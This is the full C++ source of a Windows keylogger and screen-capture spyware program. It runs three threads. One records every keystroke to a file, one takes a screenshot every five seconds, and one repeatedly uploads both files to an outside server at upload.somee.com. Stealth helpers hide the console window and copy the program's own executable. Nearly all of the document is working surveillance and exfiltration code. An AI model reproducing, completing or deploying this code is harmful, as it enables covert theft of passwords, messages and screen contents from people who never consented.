#include <windows.h>
#include <fstream>
#include <tchar.h>
#include <GdiPlus.h>
#include <process.h>
#include <shlobj.h>
#include <CkUpload.h>
#include<stdio.h>

using namespace std;
char* param ;
void  * function4(void * argument);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);




/////////////////////////////////////////////////////////////////////////////
void Stealth()
{
HWND Stealth;
AllocConsole();
Stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(Stealth,0);
}
//////////////////////////////////////////////////////////////////////////







////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::string GetKey(int Key)
{
    std::string KeyString = "";

    if (Key == 8)
        KeyString = "[delete]";
    else if (Key == 13)
        KeyString = "\n";
    else if (Key == 32)
        KeyString = " ";
    else if (Key == VK_PAUSE)
        KeyString = "[PAUSE]";
    else if (Key == VK_CAPITAL)
        KeyString = "[CAPITAL]";
    else if (Key == VK_SHIFT)
        KeyString = "[SHIFT]";
    else if (Key == VK_TAB)
        KeyString = "[TABULATOR]";
    else if (Key == VK_CONTROL)
        KeyString = "[CTRL]";
    else if (Key == VK_ESCAPE)
        KeyString = "[ESCAPE]";
    else if (Key == VK_END)
        KeyString = "[END]";
    else if (Key == VK_HOME)
        KeyString = "[HOME]";
    else if (Key == VK_LEFT)
        KeyString = "[LEFT]";
    else if (Key == VK_RIGHT)
        KeyString = "[RIGHT]";
    else if (Key == VK_UP)
        KeyString = "[UP]";
    else if (Key == VK_DOWN)
        KeyString = "[DOWN]";
    else if (Key == VK_SNAPSHOT)
        KeyString = "[SNAPSHOT]";
    else if (Key == VK_NUMLOCK)
        KeyString = "[NUMLOCK]";
    else if (Key == 190 || Key == 110)
        KeyString = ".";

    else if (Key >=96 && Key <= 105)
        KeyString = Key-48;
    else if (Key > 47 && Key < 60)
        KeyString = Key;
    if (Key != VK_LBUTTON || Key != VK_RBUTTON)
    {
        if (Key > 64 && Key < 91)
        {
            if (GetKeyState(VK_CAPITAL))
                KeyString = Key;
            else
            {
                Key = Key + 32;
                KeyString = Key;
            }
        }
    }

    return KeyString;
}
int keylogger()
{

 int WINAPI WinMain (HINSTANCE hThisInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpszArgument,
    int nFunsterStil);
  char path[MAX_PATH];
  HMODULE GetModH = GetModuleHandle(NULL);

  char sys[MAX_PATH];
  GetModuleFileName(GetModH, path, sizeof(path));
  GetSystemDirectory(sys, sizeof(sys));
  CopyFile(path, sys, false);
  unsigned char reg[2] = "0";
  DeleteFile("App.Data");



    std::string Filename = "App.Data";
    std::string TempString = "";
    std::fstream FStream;
    FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);

    while(true)
    {
        // 0% CPU
        Sleep(5);

        for(int i = 8; i < 191; i++)
        {
           if(GetAsyncKeyState(i)&1 ==1)
           {
                TempString = GetKey (i);

                FStream.write(TempString.c_str(), TempString.size());
                FStream.close();
                FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
           }
        }
    }
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






//uploading to server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int uploadtoserver()
{
        CkUpload upload;
        upload.put_Hostname("http://upload.somee.com");
        upload.put_Path("/ReceiveUpload.aspx");
        upload.AddFileReference("App.txt","App.Data");
         upload.AddFileReference("Cache.jpg","Cache.Data");


        //  Do the upload.  The method returns when the upload
        //  is completed.
        //  This component also includes asynchronous upload capability,
        //  which is demonstrated in another example.
          bool success;
        success = upload.BlockingUpload();
        if (success != true)
        {
            printf("%s\n",upload.lastErrorText());
        }
        else {
            printf("Files uploaded!\n");
        }



}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
void gdiscreen()
{
	using namespace Gdiplus;
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	{
		HDC scrdc, memdc;
		HBITMAP membit;
		scrdc = ::GetDC(0);
		int Height = GetSystemMetrics(SM_CYSCREEN);
		int Width = GetSystemMetrics(SM_CXSCREEN);
		memdc = CreateCompatibleDC(scrdc);
		membit = CreateCompatibleBitmap(scrdc, Width, Height);
		HBITMAP hOldBitmap =(HBITMAP) SelectObject(memdc, membit);
		BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
		Gdiplus::Bitmap bitmap(membit, NULL);
		CLSID clsid;
		GetEncoderClsid(L"image/jpeg", &clsid);



       const WCHAR *filename = L"Cache.Data";

		bitmap.Save( filename,&clsid,NULL);
		SelectObject(memdc, hOldBitmap);
		DeleteObject(memdc);
		DeleteObject(membit);
		::ReleaseDC(0,scrdc);
	}
	GdiplusShutdown(gdiplusToken);
}
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	using namespace Gdiplus;
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes
	ImageCodecInfo* pImageCodecInfo = NULL;
	GetImageEncodersSize(&num, &size);
	if(size == 0)
		return -1;  // Failure
	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if(pImageCodecInfo == NULL)
		return -1;  // Failure
	GetImageEncoders(num, size, pImageCodecInfo);
	for(UINT j = 0; j < num; ++j)
	{
		if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}
	}
	free(pImageCodecInfo);
	return 0;
}


void mythreadA(void* data)
{

     while(true)
     {
     gdiscreen();
     Sleep(5000);
     }
}


void mythreadB(void* data)
{


    keylogger();
}
void mythreadC(void* data)
{
    while(true)
    {
     uploadtoserver();
     Sleep(6000);
    }


}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////










int main( void )
{







    HANDLE myhandleA, myhandleB, myhandleC;
    myhandleA = (HANDLE)_beginthread(&mythreadA, 0, 0);
    myhandleB = (HANDLE)_beginthread(&mythreadB, 0, 0);
    myhandleC = (HANDLE)_beginthread(&mythreadC, 0, 0);
    WaitForSingleObject(myhandleA, INFINITE);
    WaitForSingleObject(myhandleB, INFINITE);
    WaitForSingleObject(myhandleC, INFINITE);
    CloseHandle(myhandleA);
	CloseHandle(myhandleB);
	CloseHandle(myhandleC);



}



